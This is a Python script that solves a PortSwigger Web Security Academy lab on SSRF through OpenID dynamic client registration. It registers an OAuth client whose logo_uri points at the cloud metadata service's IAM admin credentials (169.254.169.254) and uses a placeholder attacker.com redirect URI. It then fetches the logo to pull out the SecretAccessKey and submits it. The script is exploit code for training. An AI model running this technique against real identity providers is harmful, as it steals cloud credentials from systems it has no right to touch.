# SSRF via OpenID dynamic client registration

# https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def init_auth(s, url):
	print('\n[+] Trying to generate a oauth redirection logging in as Wiener...')
	account_path = url + '/my-account'
	r = s.get(account_path)
	time.sleep(1)
	link = re.search(r"http-equiv=refresh content='3;url=(.*)'>", r.text).group(1)
	print('\n[+] Found Redirection:\t%s' % link)
	return link

def get_config(s, url, link):
	print('\n[+] Trying to retrieve the configuration...')
	oauth_url = urllib.parse.urlparse(link).scheme + '://' + urllib.parse.urlparse(link).netloc
	config_path = oauth_url + '/.well-known/openid-configuration'
	print('[+] Navigating to:\t%s\n' % config_path)
	r = s.get(config_path)
	time.sleep(1)
	print(r.text)

def get_client_id(s, url, link):
	print('\n[+] Trying to retrieve the admin security-credentials...')
	oauth_url = urllib.parse.urlparse(link).scheme + '://' + urllib.parse.urlparse(link).netloc
	reg_path = oauth_url + '/reg'
	payload = {'redirect_uris' : ['https://attacker.com'], 'logo_uri' : 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/'}
	print('[+] Sending payload:\t%s\n' % payload)
	time.sleep(1)
	r = s.post(reg_path, json=payload)
	time.sleep(1)
	print(r.text)
	time.sleep(1)
	client_id = re.search(r',"client_id":"(.*)","client_secret_expires_at', r.text).group(1)
	print('\n[+] Found Client Id:\t%s' % client_id)
	return client_id

def get_secret(s, url, link, client_id):
	print('\n[+] Trying to retrieve the admin configuration file...')
	oauth_url = urllib.parse.urlparse(link).scheme + '://' + urllib.parse.urlparse(link).netloc
	logo_path = oauth_url + '/client/' + client_id + '/logo'
	r = s.get(logo_path)
	time.sleep(1)
	print(r.text)
	secret = re.search(r'"SecretAccessKey" : "(.*)",', r.text).group(1)
	time.sleep(1)
	print('\n[+] Found Secret Access Key:\t%s' % secret)
	time.sleep(1)
	return secret

def submit_secret(s, url, secret):
	print('[+] Trying to submit the API key to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": secret}
	r = s.post(submit_path, data=submit_data)
	return r


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SSRF via OpenID dynamic client registration')
	parser = argparse.ArgumentParser(description="[+] Lab: SSRF via OpenID dynamic client registration")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to steal Secret Access Key...\n')
			time.sleep(1)
			r = s.get(url)
			link = init_auth(s, url)
			time.sleep(2)
			get_config(s, url, link)
			client_id = get_client_id(s, url, link)
			secret = get_secret(s, url, link, client_id)
			r = submit_secret(s, url, secret)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
